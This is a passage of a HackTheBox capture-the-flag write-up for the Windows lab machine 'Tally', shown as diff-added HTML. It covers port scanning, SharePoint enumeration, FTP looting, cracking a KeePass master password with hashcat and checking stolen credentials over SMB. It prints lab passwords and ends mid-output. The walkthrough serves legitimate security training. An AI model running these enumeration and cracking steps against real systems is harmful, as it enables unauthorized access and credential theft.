@@ -1,0 +1,1146 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Tally</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-tally">htb-tally</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#sharepoint">sharepoint</a> <a class="post-tag" href="/tags#mssql">mssql</a> <a class="post-tag" href="/tags#keepass">keepass</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#kpcli">kpcli</a> <a class="post-tag" href="/tags#crackmapexec">crackmapexec</a> <a class="post-tag" href="/tags#smbclient">smbclient</a> <a class="post-tag" href="/tags#mssqlclient">mssqlclient</a> <a class="post-tag" href="/tags#xp-cmdshell">xp-cmdshell</a> <a class="post-tag" href="/tags#firefox">firefox</a> <a class="post-tag" href="/tags#user-agent">user-agent</a> <a class="post-tag" href="/tags#searchsploit">searchsploit</a> <a class="post-tag" href="/tags#cve-2016-1960">cve-2016-1960</a> <a class="post-tag" href="/tags#shellcode">shellcode</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#scheduled-task">scheduled-task</a> <a class="post-tag" href="/tags#rottenpotato">rottenpotato</a> <a class="post-tag" href="/tags#sweetpotato">sweetpotato</a> <a class="post-tag" href="/tags#cve-2017-0213">cve-2017-0213</a> <a class="post-tag" href="/tags#visual-studio">visual-studio</a> <a class="post-tag" href="/tags#windows-sessions">windows-sessions</a> <a class="post-tag" href="/tags#msfvenom">msfvenom</a> <a class="post-tag" href="/tags#metasploit">metasploit</a> <a class="post-tag" href="/tags#migrate">migrate</a> <a class="post-tag" href="/tags#oscp-plus-v1">oscp-plus-v1</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-04-11T09:00:00+00:00" itemprop="datePublished">Apr 11, 2022
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2022/04/11/htb-tally.html" style="color: #e6e6e6; text-decoration: none;">HTB: Tally</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/tally-cover.webp" type="image/webp"/>
+<img alt="Tally" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/tally-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Tally is a difficult Windows Machine from Egre55, who likes to make boxes with multiple paths for each step. The box starts with a lot of enumeration, starting with a SharePoint instance that leaks creds for FTP. With FTP access, there are two paths to root. First there’s a KeePass db with creds for SMB, which has a binary with creds for MSSQL, and I can use MSSQL access to run commands and get a shell. Alternatively, I can spot a Firefox installer and a note saying that certain HTML pages on the FTP server will be visited regularly, and craft a malicious page to exploit that browser. To escalate, there’s a scheduled task running a writable PowerShell script as administrator. There’s also SeImpersonate privilege in a shell gained via MSSQL, which can be leveraged to get root as well. Finally, I’ll show a local Windows exploit that was common at the time of the box release, CVE-2017-0213.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/113 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/tally" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Tally</a> <a href="https://hackthebox.com/machines/tally" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-tally.webp" type="image/webp"/> <img alt="Tally" class="img-av" src="/icons/box-tally.png"/></picture></a><br/><a href="https://hackthebox.com/machines/tally" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/926159192754450432">04 Nov 2017</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">05 May 2018</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/tally-diff.webp" type="image/webp"/><img alt="Rated difficulty for Tally" src="/img/tally-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/tally-radar.webp" type="image/webp"/><img alt="Radar chart for Tally" src="/img/tally-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">21:09:43</span><a href="https://app.hackthebox.com/users/6752" rel="noopener" target="_blank"><img alt="tress" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/6752" style="display: unset"/><span class="user-text" style="display: none"> tress</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">1 day<span class="blood-time">15:36:40</span><a href="https://app.hackthebox.com/users/1391" rel="noopener" target="_blank"><img alt="decoder" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/1391" style="display: unset"/><span class="user-text" style="display: none"> decoder</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/1190" rel="noopener" target="_blank"><img alt="egre55" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/1190" style="display: unset"/><span class="user-text" style="display: none"> egre55</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds 21 open TCP ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.59
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-09 10:54 UTC
+Warning: 10.10.10.59 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.59
+Host is up (0.090s latency).
+Not shown: 65469 closed ports, 45 filtered ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+80/tcp    open  http
+81/tcp    open  hosts2-ns
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+808/tcp   open  ccproxy-http
+1433/tcp  open  ms-sql-s
+5985/tcp  open  wsman
+15567/tcp open  unknown
+32843/tcp open  unknown
+32844/tcp open  unknown
+32846/tcp open  unknown
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 19.43 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 21,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664-49670 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.59
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-09 11:02 UTC
+Nmap scan report for 10.10.10.59
+Host is up (0.090s latency).
+
+PORT      STATE SERVICE            VERSION
+21/tcp    open  ftp                Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http               Microsoft IIS httpd 10.0
+|_http-generator: Microsoft SharePoint
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Home
+|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
+81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Bad Request
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+808/tcp   open  ccproxy-http?
+1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: TALLY
+|   NetBIOS_Domain_Name: TALLY
+|   NetBIOS_Computer_Name: TALLY
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY
+|_  Product_Version: 10.0.14393
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2022-04-09T10:46:05
+|_Not valid after:  2052-04-09T10:46:05
+|_ssl-date: 2022-04-09T11:03:41+00:00; 0s from scanner time.
+5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+15567/tcp open  http               Microsoft IIS httpd 10.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|   Negotiate
+|_  NTLM
+| http-ntlm-info: 
+|   Target_Name: TALLY
+|   NetBIOS_Domain_Name: TALLY
+|   NetBIOS_Computer_Name: TALLY
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY
+|_  Product_Version: 10.0.14393
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title.
+32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
+| Subject Alternative Name: DNS:localhost, DNS:tally
+| Not valid before: 2017-09-17T22:51:16
+|_Not valid after:  9999-01-01T00:00:00
+|_ssl-date: 2022-04-09T11:03:41+00:00; 0s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+32846/tcp open  storagecraft-image StorageCraft Image Manager
+47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc              Microsoft Windows RPC
+49665/tcp open  msrpc              Microsoft Windows RPC
+49666/tcp open  msrpc              Microsoft Windows RPC
+49667/tcp open  msrpc              Microsoft Windows RPC
+49668/tcp open  msrpc              Microsoft Windows RPC
+49669/tcp open  msrpc              Microsoft Windows RPC
+49670/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| ms-sql-info: 
+|   10.10.10.59:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2016 RTM
+|       number: 13.00.1601.00
+|       Product: Microsoft SQL Server 2016
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-04-09T11:03:31
+|_  start_date: 2022-04-09T10:45:44
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.92 seconds
+</span></code></pre></div></div>
+<p>The box is clearly a Windows host, and based on the <a href="https://en.wikipedia.org/wiki/Internet_Information_Services#Versions">IIS version</a>, the host is likely running Windows 10 or Server 2016 (it’s not going to be 2019 since this box was released in 2017).</p>
+<p>When I Google “Windows TCP 32843”, the first link is <a href="https://blogit.create.pt/fabiocarvalho/2017/02/14/sharepoint-2016-tcpip-ports/">this post about TCP ports used by SharePoint</a>. It included 808, 32843, 32844, and 32864 as services in use for SharePoint, and this is a pretty good indication of what may be to come.</p>
+<p>With this many ports, I’ll make a list of what I want to investigate. First, I need to dig right into:</p>
+<ul>
+<li>HTTP using IIS on 80, which <code class="language-plaintext highlighter-rouge">nmap</code> identified as SharePoint.</li>
+</ul>
+<p>There’s a bunch of services that I’ll need creds to connect to (I’ll do a quick check for each to confirm that):</p>
+<ul>
+<li>FTP on 21 - <code class="language-plaintext highlighter-rouge">nmap</code> didn’t call out anonymous login, and I confirmed it. Will check back with creds.</li>
+<li>HTTP using IIS on 15567 - Visiting just prompts for HTTP basic auth, and I don’t have creds.</li>
+<li>SMB/RPC/NetBios on 135/139/445 - Trying to connect with <code class="language-plaintext highlighter-rouge">smbclient -N -L //10.10.10.59</code> returns <code class="language-plaintext highlighter-rouge">NT_STATUS_ACCESS_DENIED</code>. Will have to check back if I find creds.</li>
+<li>MSSQL on 1433 - Need creds to authenticate to the DB.</li>
+<li>WinRM on 5985 - Not much I can do without creds, but with creds, worth a try to get a shell.</li>
+</ul>
+<p>Then there’s other ports I basically ignore for now:</p>
+<ul>
+<li>81 - Some kind of service HTTP, but querying it just returns Bad- Request.</li>
+<li>808, 32843, 32844, 32846 - All support SharePoint based on the link above.</li>
+<li>47001 - Support for WinRM</li>
+<li>49664-49670 - RPC ports</li>
+</ul>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.59</code> redirects to a SharePoint home page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220409121206314.webp" type="image/webp"/>
+<img alt="image-20220409121206314" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220409121206314.png"/>
+</picture>
+<p>SharePoint likes being accessed by hostname, and <code class="language-plaintext highlighter-rouge">nmap</code> did find the hostname <code class="language-plaintext highlighter-rouge">tally</code>. I’ll add that to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.59 tally
+</code></pre></div></div>
+<p>Loading <code class="language-plaintext highlighter-rouge">http://tally</code> seems to load the same page.</p>
+<p>There’s not much I can do here. Some Googling for “pentesting Sharepoint” finds <a href="https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/">this article</a> from BishopFox. Looking at my notes from originally solving in 2018, I actually used the Perl script in that article to brute force paths. This time, I just used the paths it listed in the article to manually find some things. Some (like <code class="language-plaintext highlighter-rouge">aclinv.aspx</code> require auth), but <code class="language-plaintext highlighter-rouge">_layouts/viewlsts.aspx</code> does return something:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220409123120157.webp" type="image/webp"/>
+<img alt="image-20220409123120157" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220409123120157.png"/>
+</picture>
+<p>The “Documents” section seems to have one item, and clicking shows it’s interesting:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220409123455622.webp" type="image/webp"/>
+<img alt="image-20220409123455622" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220409123455622.png"/>
+</picture>
+<p>Clicking on <code class="language-plaintext highlighter-rouge">ftp-details</code> downloads a <code class="language-plaintext highlighter-rouge">.docx</code> file, which has creds:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220409123537232.webp" type="image/webp"/>
+<img alt="image-20220409123537232" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220409123537232.png"/>
+</picture>
+<p>It doesn’t give me any usernames, just passwords.</p>
+<p>The “Site Pages” link indicates on item as well. Visiting this with a base of the IP will actually just redirect to the home page. But using <code class="language-plaintext highlighter-rouge">tally</code>, it will show the pages:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220409125955913.webp" type="image/webp"/>
+<img alt="image-20220409125955913" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220409125955913.png"/>
+</picture>
+<p>When I originally solved this, I found this page by looking at the mobile version of the site (using a mobile User Agent string). Either way, looking at the page, it gives some usernames:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220409130212971.webp" type="image/webp"/>
+<img alt="image-20220409130212971" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220409130212971.png"/>
+</picture>
+<p>There’s sarah, tim, and rahul, but also ftp_user.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP headers show <code class="language-plaintext highlighter-rouge">X-Powered-By: ASP.NET</code>, which matches the <code class="language-plaintext highlighter-rouge">.aspx</code> extension I’ve noticed on the pages. Other than that, not much I can gleem.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll start to <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site with <code class="language-plaintext highlighter-rouge">-x aspx</code> since I’ve already seen that, but it’s very slow, and throws a lot of errors. I can come back and try more if I get stuck, but I’ll abandon that for now.</p>
+<h3 id="ftp---tcp-21">FTP - TCP 21</h3>
+<h4 id="download">Download</h4>
+<p>The password from the file doesn’t work with tim, sarah, or rahul, but it does work for ftp_user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ftp 10.10.10.59
+<span class="go">Connected to 10.10.10.59.
+220 Microsoft FTP Service
+Name (10.10.10.59:oxdf): ftp_user
+331 Password required
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+</span><span class="gp">ftp&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>There are five directories at the system root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-31-17  11:51PM       &lt;DIR&gt;          From-Custodian
+10-01-17  11:37PM       &lt;DIR&gt;          Intranet
+08-28-17  06:56PM       &lt;DIR&gt;          Logs
+09-15-17  09:30PM       &lt;DIR&gt;          To-Upload
+09-17-17  09:27PM       &lt;DIR&gt;          User
+226 Transfer complete.
+</span></code></pre></div></div>
+<p>Given the large number of small looking files, I’ll just download everything using <code class="language-plaintext highlighter-rouge">wget</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wget <span class="nt">-r</span> <span class="s1">'ftp://ftp_user:UTDRSCH53c"$6hys@10.10.10.59'</span>
+<span class="go">...[snip]...
+Total wall clock time: 2m 50s
+Downloaded: 125 files, 98M in 1m 43s (972 KB/s)
+</span></code></pre></div></div>
+<p>This will create a directory named <code class="language-plaintext highlighter-rouge">10.10.10.59</code> and populate it with the contents of the FTP server.</p>
+<h4 id="enumeration">Enumeration</h4>
+<p><code class="language-plaintext highlighter-rouge">From-Custodian</code> has a bunch of <code class="language-plaintext highlighter-rouge">.log</code> files and <code class="language-plaintext highlighter-rouge">Logs</code> has a bunch of <code class="language-plaintext highlighter-rouge">.txt</code> files that don’t seem very interesting.</p>
+<p><code class="language-plaintext highlighter-rouge">Intranet/Binaries</code> has an installer for Firefox, <code class="language-plaintext highlighter-rouge">Firefox Setup 44.0.2.exe</code>. That’s worth noting for a version number of Firefox that’s likely installed on Tally.</p>
+<p><code class="language-plaintext highlighter-rouge">To-Upload</code> has an <code class="language-plaintext highlighter-rouge">employees.xlsx</code> that contains 179 users, with first, last, and id. There’s also an <code class="language-plaintext highlighter-rouge">Invoiced.zip</code>, but it doesn’t have anything interesting.</p>
+<p><code class="language-plaintext highlighter-rouge">User</code> has a bunch of users:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">Administrator  Ekta  Jess  Paul  Rahul  Sarah  Stuart  Tim  Yenwi
+</span></code></pre></div></div>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">find</code> with <code class="language-plaintext highlighter-rouge">-type f</code> to get a list of all the files in <code class="language-plaintext highlighter-rouge">User</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f
+<span class="go">./Tim/Project/Log/do to.txt
+./Tim/Files/KeePass-2.36/KeePass.exe
+./Tim/Files/KeePass-2.36/KeePass.chm
+./Tim/Files/KeePass-2.36/KeePassLibC64.dll
+./Tim/Files/KeePass-2.36/ShInstUtil.exe
+./Tim/Files/KeePass-2.36/License.txt
+./Tim/Files/KeePass-2.36/KeePass.XmlSerializers.dll
+./Tim/Files/KeePass-2.36/KeePassLibC32.dll
+./Tim/Files/KeePass-2.36/KeePass.exe.config
+./Tim/Files/bonus.txt
+./Tim/Files/tim.kdbx
+./Jess/actu8-espreadsheet-designer-datasheet.pdf
+./Sarah/notes.txt
+./Sarah/Windows-KB890830-x64-V5.52.exe
+./Sarah/MBSASetup-x64-EN.msi
+./Paul/Monetary_penalties_for_breaches_of_financial_sanctions.pdf
+./Paul/financial_sanctions_guidance_august_2017.pdf
+./Paul/financial-list-guide.pdf
+./Stuart/customers - Copy.csv
+./Stuart/Unit4-Connect-Financials-Agenda.pdf
+./Ekta/PSAIS_1_April_2017.pdf
+./Ekta/OFSI_quick_guide_flyer.pdf
+</span></code></pre></div></div>
+<p>Two things jump out as the most interesting things:</p>
+<ul>
+<li>Tim has a KeePass database, <code class="language-plaintext highlighter-rouge">tim.kdbx</code>.</li>
+<li>Sarah has a <code class="language-plaintext highlighter-rouge">notes.txt</code>.</li>
+</ul>
+<p>The <code class="language-plaintext highlighter-rouge">notes.txt</code> references removing Orchard CMS, and the need to uninstall SQL Server 2016.</p>
+<h3 id="keepass-db">KeePass DB</h3>
+<h4 id="crack-master-password">Crack Master Password</h4>
+<p>To get into a KeePass database, I’ll need the master password. I’ll use the <code class="language-plaintext highlighter-rouge">john</code> script <code class="language-plaintext highlighter-rouge">keepass2john</code> to get a hash of that password that I can attempt to break with <code class="language-plaintext highlighter-rouge">hashcat</code> (or <code class="language-plaintext highlighter-rouge">john</code>, I just prefer <code class="language-plaintext highlighter-rouge">hashcat</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>keepass2john 10.10.10.59/User/Tim/Files/tim.kdbx 
+<span class="gp">tim:$</span>keepass<span class="nv">$*</span>2<span class="k">*</span>6000<span class="k">*</span>0<span class="k">*</span>f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb<span class="k">*</span>3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea<span class="k">*</span>3f759d7011f43b30679a5ac650991caa<span class="k">*</span>b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192<span class="k">*</span>535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>keepass2john 10.10.10.59/User/Tim/Files/tim.kdbx <span class="o">&gt;</span> tim.kdbx.hash
+</code></pre></div></div>
+<p>I’ll start <code class="language-plaintext highlighter-rouge">hashcat</code> running against the hash with <code class="language-plaintext highlighter-rouge">rockyou.txt</code> as the wordlist. The new version of <code class="language-plaintext highlighter-rouge">hashcat</code> doesn’t require me to identify the hash format, but rather finds it for me:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>/opt/hashcat-6.2.5/hashcat.bin tim.kdbx.hash <span class="nt">--user</span> /usr/share/wordlists/rockyou.txt 
+<span class="go">...[snip]...
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
+...[snip]...
+</span><span class="gp">$</span>keepass<span class="nv">$*</span>2<span class="k">*</span>6000<span class="k">*</span>0<span class="k">*</span>f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb<span class="k">*</span>3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea<span class="k">*</span>3f759d7011f43b30679a5ac650991caa<span class="k">*</span>b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192<span class="k">*</span>535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>It finds the password in less than 10 seconds, “simplementeyo”.</p>
+<h4 id="extract-creds">Extract Creds</h4>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">kpcli</code> to read the database. On connecting, it asks for the password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kpcli <span class="nt">--kdb</span> tim.kdbx                                                                         
+<span class="go">Please provide the master password: *************************
+                                                                    
+KeePass CLI (kpcli) v3.1 is ready for operation.
+Type 'help' for a description of available commands.
+Type 'help &lt;command&gt;' for details on individual commands.
+                                                                    
+</span><span class="gp">kpcli:/&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>A quick way to list all the password in the database is the <code class="language-plaintext highlighter-rouge">find</code> command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">kpcli:/&gt;</span><span class="w"> </span>find <span class="nb">.</span>
+<span class="go">Searching for "." ...
+ - 3 matches found and placed into /_found/
+</span><span class="gp">Would you like to list them now? [y/N]</span><span class="w"> 
+</span><span class="go">=== Entries ===             
+0. Default                                                                 
+1. PDF Writer                                                              
+2. TALLY ACCT share
+</span></code></pre></div></div>
+<p>Now <code class="language-plaintext highlighter-rouge">show -f [number]</code> will give details on that number (without the <code class="language-plaintext highlighter-rouge">-f</code> the password will be hidden):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">kpcli:/&gt;</span><span class="w"> </span>show <span class="nt">-f</span> 0
+<span class="go">
+ Path: /WORK/CISCO/
+Title: Default
+Uname: cisco
+ Pass: cisco123
+  URL: 
+Notes: 
+
+</span><span class="gp">kpcli:/&gt;</span><span class="w"> </span>show <span class="nt">-f</span> 1
+<span class="go">
+ Path: /WORK/SOFTWARE/
+Title: PDF Writer
+Uname: 64257-56525-54257-54734
+ Pass: 
+  URL: 
+Notes: 
+
+</span><span class="gp">kpcli:/&gt;</span><span class="w"> </span>show <span class="nt">-f</span> 2
+<span class="go">
+ Path: /WORK/WINDOWS/Shares/
+Title: TALLY ACCT share
+Uname: Finance
+ Pass: Acc0unting
+  URL: 
+Notes: 
+</span></code></pre></div></div>
+<p>The two sets of creds I’ll take away are “cisco”/”cisco123” and “Finance”/”Acc0unting”. The latter says it’s for a share on Tally. I won’t find anywhere where the cisco password is useful.</p>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<h4 id="validate-creds">Validate Creds</h4>
+<p><code class="language-plaintext highlighter-rouge">crackmapexec</code> shows those creds work for SMB on Tally:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>crackmapexec smb 10.10.10.59 <span class="nt">-u</span> Finance <span class="nt">-p</span> Acc0unting
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (</span><span class="netexec-logfail">signing:False</span><span class="go">) (SMBv1:True)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-logsuccess">[+]</span><span class="go"> TALLY\Finance:Acc0unting 
+</span></code></pre></div></div>
+<p>Adding the <code class="language-plaintext highlighter-rouge">--shares</code> options shows there is an <code class="language-plaintext highlighter-rouge">ACCT</code> share, and that these creds can read from it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>crackmapexec smb 10.10.10.59 <span class="nt">-u</span> Finance <span class="nt">-p</span> Acc0unting <span class="nt">--shares</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (</span><span class="netexec-logfail">signing:False</span><span class="go">) (SMBv1:True)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-logsuccess">[+]</span><span class="go"> TALLY\Finance:Acc0unting 
